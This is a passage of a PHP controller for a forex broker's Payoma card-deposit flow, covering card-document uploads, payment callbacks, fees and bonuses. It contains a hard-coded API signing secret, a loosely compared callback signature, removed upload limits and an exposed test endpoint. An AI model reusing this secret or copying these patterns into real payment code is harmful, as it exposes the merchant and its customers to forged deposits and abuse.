                        if ($WebService2->request_status === 'RET_OK') {
                            $balance = $WebService2->get_result('Balance');
                            $this->account_model->updateAccountBalance($account_number, $balance);
                        ////FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
                        } else {
                            $insertDepositFailed['comment'] = $WebService2->request_status;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }
                    } else {
                        $insertDepositFailed['comment'] = $requestResult;
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                    }

                    if ($fee > 0) {
                        $WebService = new WebService($config);
                        $account_number = $accData['account_number'];

//                        if (IPLoc::APIUpgradeDevIP()) {
                            $WebService = FXPP::DepositRealFund($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['PAYOMA'].$data['transaction_id']);
                            $requestResult = $WebService['requestResult'];
                            $ticket = $WebService['ticket'];
//                        } else {
//                            $WebService->update_live_deposit_balance($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['PAYOMA'].$data['transaction_id']);
//                            $requestResult = $WebService->request_status;
//                            $ticket = $WebService->get_result('Ticket');
//                        }

                        if ($requestResult === 'RET_OK') {
                            $data_fee['mt_ticket'] = $ticket;

                            $WebService2 = new WebService($config);
                            $WebService2->request_live_account_balance($account_number);
                            if ($WebService2->request_status === 'RET_OK') {
                                $balance = $WebService2->get_result('Balance');
                                $this->account_model->updateAccountBalance($account_number, $balance);
                            ////FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
                            } else {
                                $insertDepositFailed['comment'] = $WebService2->request_status;
                                $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                            }
                        } else {
                            $insertDepositFailed['comment'] = $requestResult;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }
                    }

                    $deposit_id = $this->deposit_model->insertPayment($data);
                    if ($fee > 0) {
                        $this->deposit_model->insertPayment($data_fee);
                    }

                    $updateData = ['status' => 1];
                    $this->general_model->updatemy('payoma', 'order_id', $orderXMLObj['order_id'], $updateData);

//                    FXPP::updateAccountTradingStatus($account_number,$invData['user_id']); // for pro accounts

                    if (IPLoc::APIUpgradeDevIP()) {
                        FXPP::updateAccountTradingStatusV2($account_number, $invData['user_id']); // for pro accounts
                    } else {
                        FXPP::updateAccountTradingStatus($account_number, $invData['user_id']); // for pro accounts
                    }

                    /* ========================================== Welcome bonus================================================ **/

//                    if ($invData['bonus'] == 'tenpb') {
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 10%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'PAYOMA', 'tenpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'twpb') {
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 20%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'PAYOMA', 'twpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'tpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 30%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'PAYOMA', 'tpb', $data['transaction_id']);
//                    }
//                    if ($invData['bonus'] == 'fpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 50%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'PAYOMA', 'fpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'hpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART limited 100%  BONUS
//                        FXPP::Deposit100PercentBonus($invData['user_id'], $account_number, $total_amount, 'PAYOMA', 'hplb', $data['transaction_id']);
//                    }
//
//                    if (IPLoc::Office()) {
//                        if ($invData['bonus'] == 'rhpb') {
//                            FXPP::DepositRegular100PercentBonus($invData['user_id'], $account_number, $total_amount, 'PAYOMA', 'rhpb', $data['transaction_id']);
//                        }
//                    }

                    self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, 'PAYOMA', $invData['bonus'], $data['transaction_id'], false);

                    $bonuses = FXPP::getAccountBonusByType($account_number);
                    $qiwi_amount = $orderXMLObj['amount'];
                    $RequestLogintype = $this->account_model->getAccountLoginType($invData['user_id']);
                    if ($RequestLogintype['login_type'] != 1) {
                        if ($qiwi_amount > 0 and $bonuses[2] > 0) {
                            FXPP::BonusProfitCancellation($invData['user_id'], $account_number, $qiwi_amount, $data['transaction_id']);
                        }
                    }

                    // Bonus Profit Logs**/
                    $ndbProfitLogs = [
                        'Account_number' => $account_number,
                        'DepAmount' => $orderXMLObj['amount'],
                        'UserId' => $invData['user_id'],
                        'TransactionId' => $data['transaction_id'],
                        'ndbbonus' => $bonuses[2],
                    ];
                    $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                    $insertProfitLogs = [
                        'logs' => $encodeNdbProfitLogs,
                        'User_Id' => $invData['user_id'],
                    ];

                    $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                    /**=========================================== Welcome bonus end ====================================================**/

                    /**  Use original amount for Cent accounts**/
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    $processed_amount = floatval($conv_amount_usd) + floatval($conv_amount_fee_usd);
                    if ($isMicro) {
                        $processed_amount /= 100;
                    }
                    /* End **/
                    /* Send successful email deposit to auto-reports **/
                    $this->sendEmailAfterSuccessDeposit('PAYOMA', $processed_amount, $account_number, $invData['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type['PAYOMA'].$data['transaction_id']);
                    /* End **/
                }
            }
        } elseif (status == 'failed') {
            $updateData = ['status' => 2];
            $this->general_model->updatemy('payoma', 'order_id', $orderXMLObj['order_id'], $updateData);
        }
    }

    private function payoma_v1()
    {
        //  if(FXPP::isAccountFromEUCountry()){redirect('');}

        // FXPP-10307 Disallow some clients from certain countries from seeing the deposit via Payoma option
//        if(FXPP::notAllowedPayomaDepositCountry()){
//            show_404('accessing');
//        }

        if ($this->session->userdata('logged')) {
            // FXPP::LoginTypeRestriction();
            $data['is_allowed_deposit'] = false;
            $user_id = $this->session->userdata('user_id');
            if (!FXPP::notAllowedPayomaDepositCountry()) {   // FXPP-10307 Disallow some clients from certain countries from seeing the deposit via Payoma option
                $data['is_allowed_deposit'] = true;

                $account_detail = $this->general_model->whereConditionQuery($user_id);
                $currency_conv = $account_detail['currency'];
                $acc_number = $account_detail['account_number'];
                $data['amount'] = $this->input->post_get('amount1', true);
                $data['bounusfiled'] = $this->input->get('bonus', true);
                //  if ($data['amount'] == null) {
                //$this->form_validation->set_rules('amount', 'Amount', 'trim|required|xss_clean');
                $this->form_validation->set_rules('amount', 'Deposit amount', "trim|required|deposit_min_amount[$currency_conv]");
                $this->form_validation->set_rules('card_number', 'Card number', 'trim|required|xss_clean');
                //  }

                $validation_free_accounts = [58026414, 192912];

                if (!in_array($acc_number, $validation_free_accounts)) {
                    if (empty($_FILES['front_side']['name']) || empty($_FILES['back_side']['name'])) {
                        $this->form_validation->set_rules('front_side', 'Fornt side', 'trim|required');
                        $this->form_validation->set_rules('back_side', 'Back side', 'trim|required');
                    }
                }

//            $hasInNdbBonus = $this->NodepositBonusValidation($user_id);
//            if ($hasInNdbBonus == 2) { //has Ndb Bonus
//                $data['CurPendValidation'] = $this->CurrentAndPendingTradesValidation();//returns false if no open trades
//            }

                $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'), 'payoma');
                if ($this->form_validation->run() && !$data['error_msg']) {
                    $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');
                    $user = $this->general_model->showssingle($table = 'users', 'id', $user_id, 'email,created');
                    $order_id = $this->session->userdata('user_id').time();

                    $doc1 = '';
                    $doc2 = '';

                    if (!in_array($acc_number, $validation_free_accounts)) {
                        $doc1_upload = false;
                        $doc2_upload = false;
                        $_FILES['userfile']['name'] = $_FILES['front_side']['name'];

                        $config['file_name'] = hash('haval192,4', time().$_FILES['userfile']['name']);
                        $config['upload_path'] = $this->config->item('asset_user_docs');//'./assets/user_docs';
                        $config['allowed_types'] = 'gif|JPG|JPEG|jpg|jpeg|png|bmp|pdf';
                        $config['max_size'] = '10240';
                        $config['overwrite'] = false; // DO NOT CHANGE
                        $this->load->library('upload', $config);

                        if ($this->upload->do_upload('front_side')) {
                            $uploadData = $this->upload->data();
                            $doc1 = $uploadData['file_name'];
                        } else {
                            $doc1_upload = true;
                            $errorMsg = $this->upload->display_errors();
                        }
                        $_FILES['userfile']['name'] = $_FILES['back_side']['name'];

                        $config['file_name'] = hash('haval192,4', time().$_FILES['userfile']['name']);
                        $config['upload_path'] =$this->config->item('asset_user_docs');// './assets/user_docs';
                        $config['allowed_types'] = 'gif|JPG|JPEG|jpg|jpeg|png|bmp|pdf';
                        $config['max_size'] = '10240';
                        $config['overwrite'] = false; // DO NOT CHANGE
                        $this->load->library('upload', $config);

                        if ($this->upload->do_upload('back_side')) {
                            $uploadData = $this->upload->data();
                            $doc2 = $uploadData['file_name'];
                        } else {
                            $doc2_upload = true;
                            $errorMsg = $this->upload->display_errors();
                        }
                    }

                    $data['error_msg'] = $errorMsg;
                    if (!$doc1_upload && !$doc2_upload) {
                        if ($profile && $user) {
                            $card_doc = [
                            'account_number' => $this->session->userdata('account_number'),
                            'card_number' => $this->input->post('card_number', true),
                            'order_id' => $order_id,
                            'doc1' => $doc1,
                            'doc2' => $doc2,
                            'create_date' => date('Y-m-d h:i:s'),
                            'amount' => $this->input->post('amount'),
                            'status' => 1,
                        ];
                            $this->general_model->insert('card_documents', $card_doc);

                            $data = [
                            'amount' => $this->input->post('amount'),
                            'order_id' => $order_id,
                            'account_number' => $this->session->userdata('account_number'),
                            'country' => $profile['country'],
                            'city' => $profile['city'],
                            'name' => $profile['full_name'],
                            'email' => $this->session->userdata('email'),
                            'regdate' => date('y-m-d', $user['created']),
                            'currency_type' => $this->input->post('currency_type', true),
                        ];

                            $insertData = [
                            'account_number' => $data['account_number'],
                            'amount' => $data['amount'],
                            'order_id' => $data['order_id'],
                            'bonus' => $this->input->get('bonus'),
                            'user_id' => $this->session->userdata('user_id'),
                        ];
                            $this->general_model->insert('payoma', $insertData);

                            $this->payomaXMLRequestData($data);
                        }
                    } else {
                        $this->load->model('Adminslogs_model');
                        $logsPrms = [
                        'Action' => 'Payoma Upload card document',
                        'Comment' => $this->upload->display_errors,
                        'Manager_IP' => $this->input->ip_address(),
                    ];
                        $logsData = [
                        'users_id' => $_SESSION['user_id'],
                        'page' => 'Deposit - Upload Card Documents',
                        'date_processed' => FXPP::getCurrentDateTime(),
                        'processed_users_id' => $user_id,
                        'data' => json_encode($logsPrms),
                        'processed_users_id_accountnumber' => $acc_number,
                        'comment' => 'Payoma Upload card document',
                        'admin_fullname' => $_SESSION['full_name'],
                        'admin_email' => $_SESSION['email'],
                    ];
                        $this->Adminslogs_model->insertmy($table = 'admin_log', $logsData);
                    }
                }
            }

            $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
            $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
            $data['card_document']['status'] = $this->general_model->showssingle($table = 'card_documents', 'account_number', $this->session->userdata('account_number'), '*');
            //  $data['user_status'] = $user_status;
            $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
            $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

            $status = $this->input->get('status', true);
            $data['status'] = $status;
            if ($status === 'success') {
                $data['success'] = true;
            } else {
                $data['success'] = false;
            }
            //$account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
            $account = $this->general_model->whereConditionQuery($user_id);

            $data['account'] = $account;
            $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($account['currency']);
            $data['metadata_description'] = 'Payoma.';
            $this->template->title('ForexMart | Deposit - Payoma')
                ->set_layout('internal/main')
                ->prepend_metadata("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                ->build('deposits/payoma', $data);
        } else {
            redirect('signout');
        }
    }

    private function payomaCatagory2()
    {
        $user_id = $this->session->userdata('user_id');

        $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');
        $allow_country = ['CA', 'AU', 'BR', 'VN', 'PH'];

        if (in_array($profile['country'], $allow_country)) {
            return true;
        }

        return false;
    }

    public function payoma()
    {
      

        if (IPLoc::IPOnlyForVenus()) {
            $this->payoma_v2();
        }else{
            if (FXPP::isPayomaPayMentAvailable()) {
                $this->payoma_v2();
            } else {
                show_404('accessing');
            }
        }

        //   $this->payoma_v2();
        // if($this->payomaCatagory2()){
        //     $this->payoma_v2();
        // }else{
        //     $this->payoma_v1();
        // }
    }

    private function payoma_v2()
    {
        //  if(FXPP::isAccountFromEUCountry()){redirect('');}

        if ($this->session->userdata('logged')) {
            if (IPLoc::IPOnlyForVenus()) {
           
            }else{
                if (!FXPP::isPayomaPayMentAvailable()) {
                    show_404('accessing');
                }
            }
    
            $data['is_allowed_deposit'] = false;

            $user_id = $this->session->userdata('user_id');

            $data['is_allowed_deposit'] = true;
            $account_number = $this->session->userdata('account_number');

            $data['card_numbers'] = [];
            $card_document_status = false;

            if ($account_number == 198505) { //FXPP-12008
                $data['is_allowed_deposit'] = true;
                $card_document_status = true;
                $data['card_numbers'][] = '*******';
            }

            $cardNumberList = $this->deposit_model->getCardNumberByStatus($account_number, 2);

            if ($cardNumberList) {
                $card_document_status = true;
                foreach ($cardNumberList as $card_key => $card_data) {
                    if ($card_data['status'] == 1) {
                        $data['card_numbers'][] = $card_data['card_number'];
                    }
                }
            }

            if (isset($_GET['cd']) && strlen($_GET['cd']) > 5) {
                $data['card_numbers'][] = FXPP::decode($_GET['cd']);
            } else {
                if (!$card_document_status) {
                    redirect('deposit/card-documents');
                }
            }

            // FXPP::LoginTypeRestriction();

            $account_detail = $this->general_model->whereConditionQuery($user_id);
            $currency_conv = $account_detail['currency'];
            $acc_number = $account_detail['account_number'];
            $data['amount'] = $this->input->post_get('amount1', true);
            $data['bounusfiled'] = $this->input->get('bonus', true);
            $payment_currency = $this->input->post('currency_type', true);

            $field_value = '';
            if ($_POST) {
                $field_value = [
                      'from_card_number' => $this->input->post('card_number', true),
                      'amount' => $this->input->post('amount', true),
                ];
            }

            //  if ($data['amount'] == null) {
            $this->form_validation->set_rules('amount', 'Deposit amount', "trim|required|deposit_payoma_amt_validation[$payment_currency]");

            //  }

            $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');

            $data['allow_country'] = false;

            $allow_country = ['CA', 'AU', 'BR', 'VN', 'PH'];

            if (in_array($profile['country'], $allow_country)) {
                $data['allow_country'] = true;
            }

            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'), 'payoma');
            if ($this->form_validation->run() && !$data['error_msg']) {
                $user = $this->general_model->showssingle($table = 'users', 'id', $user_id, 'email,created');
                $order_id = $this->session->userdata('user_id').time();

                if ($profile && $user) {
                    $data = [
                            'amount' => $this->input->post('amount'),
                            'order_id' => $order_id,
                            'account_number' => $this->session->userdata('account_number'),
                            'country' => $profile['country'],
                            'city' => $profile['city'],
                            'name' => $profile['full_name'],
                            'email' => $this->session->userdata('email'),
                            'regdate' => date('y-m-d', $user['created']),
                            'currency_type' => $this->input->post('currency_type', true),
                        ];

                    $additional_bonus = $this->validateAdditionalBonus($this->input->get('addBonus'));

                    $insertData = [
                            'account_number' => $data['account_number'],
                            'amount' => $data['amount'],
                            'order_id' => $data['order_id'],
                            'bonus' => $this->input->get('bonus'),
                            'user_id' => $this->session->userdata('user_id'),
                            'currency' => $this->input->post('currency_type', true),
                            'additional_tenp_bonus' => $additional_bonus,
                        ];
                    $this->general_model->insert('payoma', $insertData);

                    $this->payomaXMLRequestData($data);
                }
            }

            $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
            $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));

            //  $data['user_status'] = $user_status;
            $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
            $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

            $status = $this->input->get('status', true);
            $data['status'] = $status;
            if ($status === 'success') {
                $data['success'] = true;
            } else {
                $data['success'] = false;
            }

            $data['field_value'] = $field_value;

            $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
            $data['account'] = $account;
            $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);

            $data['metadata_description'] = 'Payoma.';
            $this->template->title('ForexMart | Deposit - Payoma')
                ->set_layout('internal/main')
                ->prepend_metadata("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                ->build('deposits/payoma_v2', $data);
        } else {
            redirect('signout');
        }
    }

    public function payomaTest2()
    {
        $user_id = $this->session->userdata('user_id');
        $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');

        $user = $this->general_model->showssingle($table = 'users', 'id', $user_id, 'email,created');
        $order_id = $this->session->userdata('user_id').time();

        $data = [
                            'amount' => 11000,
                            'order_id' => $order_id,
                            'account_number' => $this->session->userdata('account_number'),
                            'country' => $profile['country'],
                            'city' => $profile['city'],
                            'name' => $profile['full_name'],
                            'email' => $this->session->userdata('email'),
                            'regdate' => date('y-m-d', $user['created']),
                            'currency_type' => 'USD',
                        ];

        $this->payomaXMLRequestDataTest($data);
    }

     public function card_documents()
    {

        if(FXPP::cardUsers()) {

        }else{
            if (!FXPP::isPayomaPayMentAvailable()) {
                show_404('accessing');
            }
        }



        $data['paymentType'] = $this->input->get('p', true);

        ini_set( 'memory_limit', -1);
        ini_set('upload_max_filesize', -1);  
        ini_set('post_max_size', -1);  
        ini_set('max_input_time', 3600);  
        ini_set('max_execution_time', 3600);
        
       // ini_set('post_max_size', '20M'); //FXPP-11877
     //   ini_set('upload_max_filesize', '20M'); //FXPP-11877
         // status 1 request to upload new card under category 1 clients
        $account_number = $this->session->userdata('account_number');
        // if ($rowArray = $this->general_model->whereCondition('card_documents', array('account_number' => $account_number, 'status<' => 2), '*')) {
        //     redirect('deposit/payoma');

        // }

        //  if(FXPP::isAccountFromEUCountry()){redirect('');}

        // FXPP-10307 Disallow some clients from certain countries from seeing the deposit via Payoma option
//        if(FXPP::notAllowedPayomaDepositCountry()){
//            show_404('accessing');
//        }

        if ($this->session->userdata('logged')) {
            // FXPP::LoginTypeRestriction();

            $user_id = $this->session->userdata('user_id');
            $account_detail = $this->general_model->whereConditionQuery($user_id);
            $currency_conv = $account_detail['currency'];
            $acc_number = $account_detail['account_number'];
            // $data['amount'] = $this->input->post_get('amount1', true);
            // $data['bounusfiled'] = $this->input->get('bonus', true);

            $this->form_validation->set_rules('card_number', 'Card number', 'trim|required|max_length[19]|xss_clean');

            $validation_free_accounts = [58026414, 192912];

            if(!in_array($acc_number, $validation_free_accounts)) {
                if (empty($_FILES['front_side']['name']) || empty($_FILES['back_side']['name'])) {
                    $this->form_validation->set_rules('front_side', 'Front side', 'trim|required');
                    $this->form_validation->set_rules('back_side', 'Back side', 'trim|required');
                }
            }

            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'), 'payoma');
            if ($this->form_validation->run() && !$data['error_msg']) {
                $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');
                $user = $this->general_model->showssingle($table = 'users', 'id', $user_id, 'email,created');
                $order_id = $this->session->userdata('user_id').time();
                $pType = $this->input->post('payment_type', true);

                $doc1 = '';
                $doc2 = '';
                
                if (!in_array($acc_number, $validation_free_accounts)) {
			
                    $doc1_upload = false;
                    $doc2_upload = false;
                    $_FILES['userfile']['name'] = $_FILES['front_side']['name'];

                    $config['file_name'] = hash('haval192,4', time().$_FILES['userfile']['name']);
                    $config['upload_path'] = $this->config->item('asset_user_docs');//'./assets/user_docs';
                    $config['allowed_types'] = 'gif|JPG|JPEG|jpg|jpeg|png|bmp|pdf';
                    $config['max_size'] = '10240'; //10mb
                    $config['overwrite'] = false; // DO NOT CHANGE
                    $this->load->library('upload', $config);

                    if ($this->upload->do_upload('front_side')) {
                        $uploadData = $this->upload->data();
                        $doc1 = $uploadData['file_name'];
                    } else {
                        $doc1_upload = true;
                        $errorMsg = $this->upload->display_errors();
                    }
                    $_FILES['userfile']['name'] = $_FILES['back_side']['name'];

                    $config['file_name'] = hash('haval192,4', time().$_FILES['userfile']['name']);
                    $config['upload_path'] = $this->config->item('asset_user_docs');//'./assets/user_docs';
                    $config['allowed_types'] = 'gif|JPG|JPEG|jpg|jpeg|png|bmp|pdf';
                    $config['max_size'] = '10240';
                    $config['overwrite'] = false; // DO NOT CHANGE
                    $this->load->library('upload', $config);

                    if ($this->upload->do_upload('back_side')) {
                        $uploadData = $this->upload->data();
                        $doc2 = $uploadData['file_name'];
                    } else {
                        $doc2_upload = true;
                        $errorMsg = $this->upload->display_errors();
                    }
                }

             $data['error_msg']="The uploaded file exceeds the maximum allowed size. Please upload an image size of less than 2 MB.";
                 //$data['error_msg'] = $errorMsg;
                
                
                
                
                if (!$doc1_upload && !$doc2_upload) {
                    if ($profile && $user) {

                        if(empty($pType)){
                            $card_status = 1;
                            $card_number_base64 = '';
                            $allow_country = ['CA', 'AU', 'BR', 'VN', 'PH'];
                        
                            if (in_array($profile['country'], $allow_country)) {
                                $card_status = 0;
                            }
                         
                        }else{ // zotapay and nova2pay
                            $card_status = 0;
                        }

                        if (!isset($_POST['card_number_save'])) {
                            $card_status = 8;
                            $card_number_base64 = FXPP::encode($this->input->post('card_number', true));
                        }

                        switch($pType){
                            case 'zp': 
                                $cardType = 'ZOTAPAY_CARD';
                                $rdirect = 'deposit/zotapay?type=cc&cd='.$card_number_base64;
                                 break;
                            case 'np': 
                                $cardType = 'NOVA2PAY';
                                $rdirect = 'deposit/nova2pay?cd='.$card_number_base64;
                             break;
                            default:   
                                $cardType = 'PAYOMA';
                                $rdirect = 'deposit/payoma?cd='.$card_number_base64;
                                 break;
                        }

                        $card_doc = [
                            'account_number' => $this->session->userdata('account_number'),
                            'card_number' => $this->input->post('card_number', true),
                            'order_id' => $order_id,
                            'doc1' => $doc1,
                            'doc2' => $doc2,
                            'create_date' => date('Y-m-d h:i:s'),
                            'amount' => $this->input->post('amount'),
                            'status' => $card_status,
                            'user_id' => $this->session->userdata('user_id'),
                            'payment_type' => $cardType,
                            
                        ];
                        $this->general_model->insert('card_documents', $card_doc);
                       
                        redirect($rdirect);
                        
                        
                    }
                } else {
                    $this->load->model('Adminslogs_model');
                    $logsPrms = [
                        'Action' => 'Payoma Upload card document',
                        'Comment' => $this->upload->display_errors,
                        'Manager_IP' => $this->input->ip_address(),
                    ];
                    $logsData = [
                        'users_id' => $_SESSION['user_id'],
                        'page' => 'Deposit - Upload Card Documents',
                        'date_processed' => FXPP::getCurrentDateTime(),
                        'processed_users_id' => $user_id,
                        'data' => json_encode($logsPrms),
                        'processed_users_id_accountnumber' => $acc_number,
                        'comment' => 'Payoma Upload card document',
                        'admin_fullname' => $_SESSION['full_name'],
                        'admin_email' => $_SESSION['email'],
                    ];
                    $this->Adminslogs_model->insertmy($table = 'admin_log', $logsData);
                }
            }

            $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
            $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
            //  $data['user_status'] = $user_status;
            $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
            $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

            $status = $this->input->get('status', true);
            $data['status'] = $status;
            if ($status === 'success') {
                $data['success'] = true;
            } else {
                $data['success'] = false;
            }

            // error_msg
            
            $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
            $data['account'] = $account;
            $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);
            $data['metadata_description'] = 'Payoma.';
            $data['innertab']="payoma";

            $this->template->title('ForexMart | Deposit - Payoma')
                ->set_layout('internal/main')
                ->prepend_metadata("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                ->build('deposits/payoma_card', $data);
        } else {
            redirect('signout');
        }
    }            
    public function payoma_success()
    {
        $this->session->set_flashdata('msg', 'The transaction has been completed.');
        redirect('deposit/payoma');
    }

    public function payoma_failure()
    {
        $this->session->set_flashdata('msg', 'The transaction has been failed.');
        redirect('deposit/payoma');
    }

    public function payoma_callback()
    {
        $return = base64_decode($_REQUEST['response']);
        $orderXMLObj = simplexml_load_string($return);
        $this->general_model->insert('payoma_log', ['log' => json_encode($orderXMLObj)]);
        $API_signature = 'TwfZYxTD8YOvd7MY7XEa2SDZRCz6r9qY7TIZwVP1';
        $signature = sha1($API_signature.$_REQUEST['response'].$API_signature);

        if ($_REQUEST['signature'] == $signature) {
            $this->payomaDepositProcess($orderXMLObj);
        }
    }

    private function payomaDepositProcess($orderXMLObj)
    {
        if ($orderXMLObj->status == 'success') {
            $condition_payoma = [  // save only one unique transaction id in the payoma table (task FXPP-11129)
                'order_id' => $orderXMLObj->merchant_order_id,
                'status' => 1,
            ];

            if ($this->general_model->whereCondition('payoma', $condition_payoma)) {
                return false;
            }

            if ($row = $this->general_model->where('payoma', ['order_id' => $orderXMLObj->merchant_order_id, 'status' => 0])) {
                $invData = $row->row_array();

                $updateData = ['status' => 1];
                $this->general_model->updatemy('payoma', 'order_id', $orderXMLObj->merchant_order_id, $updateData);

                if (floatval($invData['amount']) == floatval($orderXMLObj->sum)) {
                    $accData = $this->general_model->whereConditionQuery($invData['user_id']);
                    $amount = $orderXMLObj->sum;
                    $total_amount = $this->get_convert_amount($orderXMLObj->currency, $amount, $accData['currency']);
                    $currency = $orderXMLObj->currency;

                    /* FXPP-6333 */
                    $currencyStatus = $this->currency_status[$currency];
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    if ($isMicro) {
                        $amount *= 100;
                        $total_amount *= 100;
                        $currencyStatus = $this->currency_status['Cents'];
                    }
                    /* FXPP-6333 */

                    $fee = (($amount * 3.5) / 100) + 0.50; // Fee (3.5%)+ fixed feed(0.50$)
                    $bonus = $amount * 0.30;
                    $conv_amount_fee_usd = $this->get_convert_amount($currency, $fee);
                    $conv_amount_bonus_usd = $this->get_convert_amount($currency, $bonus);
                    $amount -= $fee;

                    $conv_amount = $this->get_convert_amount($orderXMLObj->currency, $amount, $accData['currency']);
                    $conv_amount_fee = $this->get_convert_amount($orderXMLObj->currency, $fee, $accData['currency']);
                    $conv_amount_bonus = $this->get_convert_amount($orderXMLObj->currency, $bonus, $accData['currency']);
                    $conv_amount_usd = $this->get_convert_amount($orderXMLObj->currency, $amount);

                    $insertDepositFailed = [
                        'transaction_id	' => $orderXMLObj->transaction_id,
                        'status	' => 0,
                        'amount	' => $amount,
                        'currency' => $orderXMLObj->currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'transaction_type' => 'PAYOMA',
                        'payment_status' => $this->paymentType_status['Deposit via Payoma'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                        'fee' => $fee,
                        'isFailed' => 0,
                        'type' => 'deposit-'.$isMicro.'-'.$invData['bonus'],
                    ];

                    $data = [
                        'transaction_id' => $orderXMLObj->transaction_id,
                        'reference_id' => $orderXMLObj->merchant_order_id,
                        'status' => 2,
                        'amount' => $amount,
                        'currency' => $orderXMLObj->currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'note' => 'Payoma deposit',
                        'transaction_type' => 'PAYOMA',
                        'conv_amount' => $conv_amount_usd,
                        'payment_status' => $this->paymentType_status['Deposit via Payoma'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                    ];

                    if ($fee > 0) {
                        $data_fee = [
                            'transaction_id' => $orderXMLObj->transaction_id,
                            'reference_id' => $orderXMLObj->merchant_order_id,
                            'status' => 2,
                            'amount' => $fee,
                            'currency' => $orderXMLObj->currency,
                            'user_id' => $invData['user_id'],
                            'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                            'note' => 'Payoma deposit',
                            'transaction_type' => 'PAYOMA',
                            'conv_amount' => $conv_amount_fee_usd,
                            'payment_status' => $this->paymentType_status['Deposit via Payoma'], //FXPP-7618
                            'currency_status' => $currencyStatus, //FXPP-7618
                        ];
                    }

                    $config = [
                        'server' => 'live_new',
                    ];
//                    $WebService = new WebService($config);

                    $account_number = $accData['account_number'];

//                  {  if (IPLoc::APIUpgradeDevIP())
                        $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['PAYOMA'].$orderXMLObj->transaction_id);
                        $requestResult = $WebServiceNew['requestResult'];
                        $ticket = $WebServiceNew['ticket'];
//                    } else {
//                        $WebService->update_live_deposit_balance($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['PAYOMA'].$orderXMLObj->transaction_id);
//                        $requestResult = $WebService->request_status;
//                        $ticket = $WebService->get_result('Ticket');
//                    }

                    if ($requestResult === 'RET_OK') {
                        $data['mt_ticket'] = $ticket;

                        // Back Agent of Client
                       // FXPP::BackAgentOfAccount($account_number);

                        $WebService2 = new WebService($config);
                        $WebService2->request_live_account_balance($account_number);
                        if ($WebService2->request_status === 'RET_OK') {
                            $balance = $WebService2->get_result('Balance');
                            $this->account_model->updateAccountBalance($account_number, $balance);
                        ////FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
                        } else {
                            $insertDepositFailed['comment'] = $WebService2->request_status;
